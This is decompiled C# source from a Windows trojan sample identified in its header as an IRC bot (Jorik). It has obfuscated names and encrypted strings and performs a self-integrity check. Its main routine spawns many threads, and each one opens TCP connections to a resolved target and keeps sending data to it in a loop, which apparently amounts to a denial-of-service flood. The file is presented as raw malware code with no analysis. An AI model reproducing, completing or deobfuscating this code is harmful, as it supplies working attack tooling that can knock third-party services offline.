// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0004;
using \u0008;
using \u000E;
using \u000F;
using System;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;

namespace \u0008
{
  internal sealed class \u0001
  {
    private static ThreadStart[] \u0001;
    private static Thread[] \u0001;
    public static string \u0001;
    public static int \u0001;
    private static IPEndPoint \u0001;
    public static int \u0002;
    public static int \u0003;
    public static bool \u0001;
    [NonSerialized]
    internal static \u0008.\u0004 \u008F;

    public static string \u0001()
    {
      if (true)
      {
        int num1 = (int) \u0092.\u0018\u0003(\u0002.\u0001(1));
        int num2;
        if (true)
          num2 = num1;
        do
        {
          int num3 = num2;
          int num4;
          while (true)
          {
            num4 = num3 % 2;
            if (false)
              num3 = num4;
            else
              break;
          }
          if (num4 == 0)
            goto label_4;
        }
        while (false);
        if (true)
          return \u0001.\u008F(1288);
      }
label_4:
      return \u0001.\u008F(1283);
    }

    public static void \u0001()
    {
      Thread thread1 = new Thread(new ThreadStart(\u0001.\u0002));
      if (true)
        goto label_2;
label_1:
      Thread thread2;
      \u0084.\u007E\u0094\u0002((object) thread2, true);
      \u0013.\u007E\u0002\u0002((object) thread2);
      return;
label_2:
      thread2 = thread1;
      goto label_1;
    }

    public static void \u0002()
    {
      try
      {
        \u0001.\u0001 = new IPEndPoint(\u0087.\u007E\u009F\u0002((object) \u0086.\u009D\u0002(\u0001.\u0001))[0], \u0001.\u0003);
      }
      catch
      {
        \u0001.\u0001 = new IPEndPoint(\u0088.\u0001\u0003(\u0001.\u0001), \u0001.\u0003);
      }
      \u0001.\u0001 = new Thread[\u0001.\u0002];
      \u0001.\u0001 = new ThreadStart[\u0001.\u0002];
      for (int index = 0; index < \u0001.\u0002; ++index)
      {
        \u0001.\u0001[index] = new ThreadStart(\u0001.\u0004);
        \u0001.\u0001[index] = new Thread(\u0001.\u0001[index]);
        \u0013.\u007E\u0002\u0002((object) \u0001.\u0001[index]);
      }
      \u001F.\u0087\u0002(\u0001.\u0001 * 1000);
      if (!\u0001.\u0001)
        return;
      \u0001.\u0003();
      string[] strArray = new string[5]
      {
        \u0001.\u008F(1297),
        \u0002.\u0001(\u0010.\u008D(\u0001.\u008F(557), \u0001.\u0001)),
        \u0001.\u008F(876),
        \u0002.\u0001(\u0089.\u0002\u0003((object) \u0001.\u008F(557), (object) \u0001.\u0001)),
        \u0001.\u008F(885)
      };
      \u0002.\u0001(\u0018.\u001A\u0002(strArray), \u0001.\u0010);
    }

    public static void \u0003() => \u0001.\u0001 = false;

    public static void \u0004()
    {
      try
      {
        string str1 = \u0001.\u008F(1322);
        string str2 = \u0093.\u0019\u0003(str1, new object[5]
        {
          (object) \u0001.\u0001(),
          (object) \u0010.\u008D(\u0001.\u008F(1415), \u0002.\u0001(7)),
          (object) \u0001.\u0001,
          (object) \u0001.\u008F(1420),
          (object) \u0092.\u0018\u0003(\u0003.\u007E\u0008((object) \u0002.\u0001(1)))
        });
        byte[] numArray1 = \u0081.\u007E\u008F\u0002((object) \u0080.\u008A\u0002(), str2);
        Socket socket;
        do
        {
          socket = \u0001.\u0001(\u0003.\u007E\u0005((object) \u008D.\u007E\u0012\u0003((object) \u0001.\u0001)), \u0001.\u0003);
        }
        while (false);
        int num1 = \u008F.\u007E\u0014\u0003((object) socket, numArray1, numArray1.Length, SocketFlags.None);
        while (\u0001.\u0001)
        {
          \u001F.\u0087\u0002(10000);
          \u0081 obj = \u0081.\u007E\u008F\u0002;
          Encoding encoding = \u0080.\u008A\u0002();
          string[] strArray = new string[6]
          {
            \u0003.\u007E\u0008((object) \u0002.\u0001(1)),
            \u0001.\u008F(1521),
            \u0003.\u007E\u000E((object) \u0002.\u0001(1)),
            \u0001.\u008F(1526),
            \u0002.\u0001(1),
            \u0001.\u008F(1531)
          };
          string str3 = \u0018.\u001A\u0002(strArray);
          byte[] numArray2 = obj((object) encoding, str3);
          int num2 = \u008F.\u007E\u0014\u0003((object) socket, numArray2, numArray2.Length, SocketFlags.None);
        }
        \u0084.\u007E\u0096\u0002((object) socket, false);
        \u0013.\u007E\u0003\u0002((object) socket);
      }
      catch
      {
        \u0001.\u0004();
      }
    }

    public static Socket \u0001([In] string obj0, [In] int obj1)
    {
      Socket socket1;
      if (true)
        socket1 = (Socket) null;
      else
        goto label_4;
label_2:
      IPAddress[] ipAddressArray;
      if (true)
      {
        IPHostEntry ipHostEntry = \u0086.\u009D\u0002(obj0);
        ipAddressArray = \u0087.\u007E\u009F\u0002((object) ipHostEntry);
      }
      else
        goto label_6;
label_4:
      int num1 = 0;
      goto label_17;
label_6:
      IPAddress address;
      IPEndPoint ipEndPoint;
      if (true)
        ipEndPoint = new IPEndPoint(address, obj1);
      Socket socket2;
      if (true)
      {
        socket2 = new Socket(\u008B.\u007E\u0004\u0003((object) ipEndPoint), SocketType.Stream, ProtocolType.Tcp);
        \u0094.\u007E\u001A\u0003((object) socket2, (EndPoint) ipEndPoint);
      }
      int index;
      if (\u008C.\u007E\u0006\u0003((object) socket2))
      {
        socket1 = socket2;
        if (false)
          goto label_2;
        else
          goto label_16;
      }
      else
        ++index;
label_14:
      int num2 = index;
      if (true)
      {
        int length = ipAddressArray.Length;
        if (num2 < length)
        {
          address = ipAddressArray[index];
          goto label_6;
        }
      }
      else
      {
        num1 = num2;
        goto label_17;
      }
label_16:
      return socket1;
label_17:
      index = num1;
      goto label_14;
    }

    static \u0001()
    {
      bool flag;
      if (true)
      {
        \u0005.\u0001(typeof (\u0001));
        flag = false;
      }
      else
        goto label_4;
label_2:
      Assembly assembly = \u007F.\u0089\u0002();
      if (\u0001.\u0001(\u0003.\u007E\u0006((object) assembly), true, out flag))
        goto label_11;
label_5:
      throw new SecurityException(\u0001.\u008F(670));
label_11:
      int num = flag ? 1 : 0;
      if (true)
      {
        if (num == 0 || !\u0005.\u007E\u0082((object) \u0003.\u007E\u0007((object) assembly), \u0001.\u008F(645)))
          goto label_5;
      }
      else
        goto label_10;
label_4:
      do
      {
        if (true)
          \u0001.\u0002 = 100;
      }
      while (false);
      if (true)
        num = 0;
      else
        goto label_2;
label_10:
      \u0001.\u0001 = num != 0;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
